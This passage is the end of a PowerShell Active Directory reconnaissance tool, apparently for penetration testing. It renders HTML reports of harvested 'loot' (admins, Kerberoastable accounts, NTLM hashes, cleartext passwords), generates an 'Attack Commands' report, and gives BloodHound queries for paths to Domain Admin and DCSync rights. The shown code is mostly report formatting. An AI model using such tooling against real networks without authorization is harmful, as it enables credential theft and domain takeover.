        $note = if ($step.Note) { "<div class='cmd-note'>? $(HtmlEsc $step.Note)</div>" } else { "" }
        $blocks += "<div class='cmd-block'><div class='cmd-desc'>$(HtmlEsc $step.Desc)</div><pre>$cmd</pre>$note</div>"
    }
    $inner = "<h3>$(HtmlEsc $tmpl.Title)$phaseTag</h3>$blocks"
    return "<div class='finding'><div class='finding-header'><span class='finding-title'>$title</span></div><div class='finding-body open'>$inner</div></div>"
}

# -- Build loot grid ------------------------------------------------------------
$daSet = $loot.DomainAdmins
$lootGrid = @(
    (Render-LootCard "Domain Users"           $loot.DomainUsers       "lh-blue"   $daSet)
    (Render-LootCard "Domain Admins"          $loot.DomainAdmins      "lh-red"    $null)
    (Render-LootCard "Domain Controllers"     $loot.DomainControllers "lh-orange" $null)
    (Render-LootCard "Domain Computers"       $loot.DomainComputers   "lh-gray"   $null)
    (Render-LootCard "Kerberoastable"         $loot.Kerberoastable    "lh-orange" $null)
    (Render-LootCard "AS-REP Roastable"       $loot.AsrepRoastable    "lh-orange" $null)
    (Render-LootCard "SPNs"                   $loot.Spns              "lh-yellow" $null)
    (Render-LootCard "NTLM Hashes"            $loot.HashesFound       "lh-red"    $null)
    (Render-LootCard "Cleartext Passwords"    $loot.PasswordsFound    "lh-red"    $null)
    (Render-LootCard "Password Policy"        $loot.PasswordPolicy    "lh-blue"   $null)
    (Render-LootCard "Domain Trusts"          $loot.DomainTrusts      "lh-yellow" $null)
    (Render-LootCard "GPOs"                   $loot.Gpos              "lh-gray"   $null)
    (Render-LootCard "Interesting Files"      $loot.InterestingFiles  "lh-yellow" $null)
) -join ""

$lootSection = @"
<div class='loot-section'>
  <h2>Intelligence Summary</h2>
  <p style='color:var(--dim);margin-bottom:8px;'>Everything collected at a glance. Domain Admin members marked ?</p>
  <div class='loot-grid'>$lootGrid</div>
</div>
"@

# -- Summary bar ----------------------------------------------------------------
$sevCounts = @{ CRITICAL=0; HIGH=0; MEDIUM=0; LOW=0; INFO=0 }
foreach ($f in $sorted) { $sevCounts[$f.Severity]++ }
$summaryBar = ($sevCounts.GetEnumerator() | Where-Object { $_.Value -gt 0 } | ForEach-Object {
    "<div class='sev-badge sev-$($_.Key)'>$($_.Key): $($_.Value)</div>"
}) -join ""
$summaryBar = "<div class='summary'>$summaryBar</div>"

# -- Finding cards --------------------------------------------------------------
$findingCards = ($sorted | ForEach-Object { Render-FindingCard $_ }) -join ""

# -- Attack cards ---------------------------------------------------------------
$attackCards = ($sorted | ForEach-Object { Render-AttackCard $_ }) -join ""

# BloodHound guide
$zipFile = Get-ChildItem $rawDir -Filter "*bloodhound*.zip" -ErrorAction SilentlyContinue | Select-Object -First 1
$zipLine = if ($zipFile) { "<li>SharpHound ZIP: <code>$($zipFile.FullName)</code></li>" } else { "<li>SharpHound ZIP not found - run SharpHound manually.</li>" }
$bhGuide = @"
<div class='guide-box'>
  <h3>BloodHound - How to Load Your Data</h3>
  <ol>
    $zipLine
    <li>Open BloodHound, connect to Neo4j database.</li>
    <li>Click <strong>Upload Data</strong> and select the ZIP above.</li>
    <li>Useful queries to run after loading:</li>
    <ul style='padding-left:20px;margin-top:8px;'>
      <li><code>Find Shortest Paths to Domain Admins</code></li>
      <li><code>Find Principals with DCSync Rights</code></li>
      <li><code>List All Kerberoastable Accounts</code></li>
      <li><code>Find AS-REP Roastable Users</code></li>
      <li><code>Shortest Paths to Unconstrained Delegation Systems</code></li>
    </ul>
  </ol>
</div>
"@

# -- Shared CSS -----------------------------------------------------------------
$css = @"
<style>
:root{--bg:#0d1117;--surface:#161b22;--border:#30363d;--text:#e6edf3;--dim:#8b949e;--critical:#ff4444;--high:#ff8800;--medium:#e3b341;--low:#58a6ff;--info:#8b949e;--orange:#ff9f43;--green:#3fb950;--code-bg:#1c2128;}
*{box-sizing:border-box;margin:0;padding:0;}
body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;font-size:14px;line-height:1.6;}
.container{max-width:1100px;margin:0 auto;padding:32px 24px;}
header{border-bottom:1px solid var(--border);padding-bottom:24px;margin-bottom:32px;}
header h1{font-size:26px;font-weight:700;}
header .meta{color:var(--dim);font-size:12px;margin-top:8px;}
.summary{display:flex;gap:16px;margin-bottom:32px;flex-wrap:wrap;}
.sev-badge{padding:10px 20px;border-radius:8px;font-weight:700;font-size:13px;border:1px solid;}
.sev-CRITICAL{color:var(--critical);border-color:var(--critical);background:#ff44440f;}
.sev-HIGH{color:var(--high);border-color:var(--high);background:#ff88000f;}
.sev-MEDIUM{color:var(--medium);border-color:var(--medium);background:#e3b3410f;}
.sev-LOW{color:var(--low);border-color:var(--low);background:#58a6ff0f;}
.sev-INFO{color:var(--info);border-color:var(--info);background:#8b949e0f;}
.loot-section{margin-bottom:40px;}
.loot-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:16px;margin-top:16px;}
.loot-card{background:var(--surface);border:1px solid var(--border);border-radius:10px;overflow:hidden;}
.loot-card-header{padding:10px 16px;font-size:12px;font-weight:700;letter-spacing:.5px;text-transform:uppercase;}
.loot-table{width:100%;border-collapse:collapse;font-family:'Consolas',monospace;font-size:12px;}
.loot-table td{padding:6px 16px;border-bottom:1px solid var(--border);color:var(--text);word-break:break-all;}
.loot-table tr:last-child td{border-bottom:none;}
.loot-table tr:hover td{background:#1f2937;}
.loot-empty{padding:10px 16px;color:var(--dim);font-size:12px;font-style:italic;}
.lh-red{background:#ff44440f;color:var(--critical);border-bottom:1px solid var(--border);}
.lh-orange{background:#ff88000f;color:var(--high);border-bottom:1px solid var(--border);}
.lh-yellow{background:#e3b3410f;color:var(--medium);border-bottom:1px solid var(--border);}
.lh-blue{background:#58a6ff0f;color:var(--low);border-bottom:1px solid var(--border);}
.lh-gray{background:#8b949e0f;color:var(--dim);border-bottom:1px solid var(--border);}
.finding{background:var(--surface);border:1px solid var(--border);border-radius:10px;margin-bottom:20px;overflow:hidden;}
.finding-header{display:flex;align-items:center;gap:12px;padding:14px 18px;cursor:pointer;user-select:none;}
.finding-header:hover{background:#1f2937;}
.sev-pill{font-size:11px;font-weight:700;padding:2px 10px;border-radius:20px;letter-spacing:.5px;flex-shrink:0;}
.finding-title{font-weight:600;font-size:15px;}
.finding-tool{margin-left:auto;font-size:11px;color:var(--dim);background:var(--border);padding:2px 8px;border-radius:4px;}
.finding-body{padding:16px 18px;border-top:1px solid var(--border);display:none;}
.finding-body.open{display:block;}
.finding-desc{color:var(--dim);margin-bottom:12px;}
.evidence-list{background:var(--code-bg);border-radius:6px;padding:10px 14px;margin-bottom:12px;}
.evidence-list li{font-family:'Consolas',monospace;font-size:12px;list-style:none;padding:2px 0;}
.cmd-block{margin-bottom:18px;}
.cmd-desc{font-size:12px;color:var(--dim);margin-bottom:6px;font-style:italic;}
.cmd-note{font-size:11px;color:var(--medium);margin-top:4px;}
pre{background:var(--code-bg);border-radius:6px;padding:12px 16px;overflow-x:auto;font-family:'Consolas',monospace;font-size:13px;border:1px solid var(--border);white-space:pre-wrap;word-break:break-all;}
.val{color:var(--orange);font-weight:700;}
.placeholder{color:#ff6b6b;opacity:.8;}
h2{font-size:20px;margin:40px 0 16px;padding-bottom:8px;border-bottom:1px solid var(--border);}
h3{font-size:14px;color:var(--orange);margin-bottom:8px;font-weight:600;}
.phase-tag{font-size:11px;color:var(--dim);background:var(--border);padding:2px 8px;border-radius:4px;margin-left:8px;}
.guide-box{background:var(--surface);border:1px solid var(--border);border-left:4px solid var(--green);border-radius:8px;padding:16px 20px;margin-bottom:24px;}
.guide-box h3{color:var(--green);}
.guide-box ol{padding-left:20px;color:var(--dim);}
.guide-box ol li{margin-bottom:6px;}
.guide-box code{background:var(--code-bg);padding:1px 6px;border-radius:3px;font-size:12px;}
</style>
<script>
document.addEventListener('DOMContentLoaded',function(){
  document.querySelectorAll('.finding-header').forEach(function(h){
    h.addEventListener('click',function(){h.nextElementSibling.classList.toggle('open');});
  });
});
</script>
"@

$ts       = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$metaLine = "Generated: $ts &nbsp;|&nbsp; Domain: <strong>$(HtmlEsc $domainVal)</strong> &nbsp;|&nbsp; DC: <strong>$(HtmlEsc $dcIpVal)</strong> &nbsp;|&nbsp; User: <strong>$(HtmlEsc $disc.Username)</strong>"

$legend = "<div style='margin-bottom:24px;padding:12px 16px;background:var(--surface);border-radius:8px;border:1px solid var(--border);'><strong>Legend:</strong>&nbsp;<span style='color:var(--orange);font-weight:700;'>Orange</span> = pre-filled from your environment &nbsp;|&nbsp; <span style='color:#ff6b6b;'>&lt;PLACEHOLDER&gt;</span> = you fill this in</div>"

# -- Write Report 1 -------------------------------------------------------------
$r1 = @"
<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><title>AD Recon - Report 1: Findings</title>$css</head>
<body><div class='container'>
<header><h1>? Report 1 - Findings &amp; Enumeration</h1><div class='meta'>$metaLine</div></header>
<h2>Summary</h2>$summaryBar
$lootSection
<h2>Findings</h2>
<p style='color:var(--dim);margin-bottom:16px;'>Click any finding to expand details.</p>
$findingCards
</div></body></html>
"@
$r1Path = Join-Path $outDir "report1_findings.html"
$r1 | Out-File $r1Path -Encoding UTF8
Write-Good "Report 1 ? $r1Path"

# -- Write Report 2 -------------------------------------------------------------
$r2 = @"
<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><title>AD Recon - Report 2: Attack Commands</title>$css</head>
<body><div class='container'>
<header><h1>??  Report 2 - Attack Commands</h1><div class='meta'>$metaLine</div></header>
<h2>BloodHound Data</h2>$bhGuide
<h2>Attack Commands</h2>$legend
$attackCards
</div></body></html>
"@
$r2Path = Join-Path $outDir "report2_attack_commands.html"
$r2 | Out-File $r2Path -Encoding UTF8
Write-Good "Report 2 ? $r2Path"

# -- Done -----------------------------------------------------------------------
Write-Section "Done"
Write-Good "Report 1 (Findings):        $r1Path"
Write-Good "Report 2 (Attack Commands): $r2Path"
Write-Host ""
Write-Host "  Raw tool output saved to: $rawDir" -ForegroundColor DarkGray
Write-Host "  Open the HTML files in any browser to view your reports." -ForegroundColor DarkGray
Write-Host ""
